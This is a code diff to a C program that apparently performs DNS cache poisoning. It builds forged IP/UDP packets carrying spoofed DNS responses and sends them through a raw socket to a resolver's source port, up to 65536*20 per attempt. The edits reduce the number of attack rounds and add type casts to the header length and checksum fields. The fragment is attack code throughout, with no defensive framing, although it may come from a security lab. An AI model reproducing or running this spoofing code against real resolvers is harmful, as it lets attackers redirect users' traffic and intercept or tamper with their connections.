@@ -44,7 +44,7 @@
 #define MAX_LEN_PORT 64
 // send at most 65536*20 spoofed packets in each attack attempt
 #define MAX_SPOOFED_PKTS   (65536 * 20)
-#define MAX_ROUNDS         1000  // Maximum attack rounds to attempt
+#define MAX_ROUNDS         20  // Maximum attack rounds to attempt
 
 /* raw socket for packet injection */
 static int g_raw_sockfd = -1;
@@ -616,8 +616,8 @@ static int inject_spoofed_packet(const uint8_t *dns_data, size_t dns_len)
     ip->version = 4;
     ip->ihl = 5;  // 5 * 4 = 20 bytes (no options)
     ip->tos = 0;
-    ip->tot_len = htons(ip_len + udp_len + dns_len);
-    ip->id = htons(rand() % 65536);
+    ip->tot_len = htons((uint16_t)(ip_len + udp_len + dns_len));
+    ip->id = htons((uint16_t)(rand() % 65536));
     ip->frag_off = 0;
     ip->ttl = 64;
     ip->protocol = IPPROTO_UDP;
@@ -630,7 +630,7 @@ static int inject_spoofed_packet(const uint8_t *dns_data, size_t dns_len)
     udp = (struct udphdr *)(packet + eth_len + ip_len);
     udp->source = htons(DNS_PORT);
     udp->dest = htons(g_resolver_src_port);
-    udp->len = htons(udp_len + dns_len);
+    udp->len = htons((uint16_t)(udp_len + dns_len));
     udp->check = 0;  // Will calculate below
     
     // === Copy DNS payload ===
@@ -638,7 +638,7 @@ static int inject_spoofed_packet(const uint8_t *dns_data, size_t dns_len)
     memcpy(dns_payload, dns_data, dns_len);
     
     // === Calculate UDP checksum ===
-    udp->check = calculate_udp_checksum(src_ip, dest_ip, udp, udp_len + dns_len);
+    udp->check = calculate_udp_checksum(src_ip, dest_ip, udp, (uint16_t)(udp_len + dns_len));
     
     // === Send packet ===
     ssize_t sent = sendto(g_raw_sockfd, packet, total_len, 0,
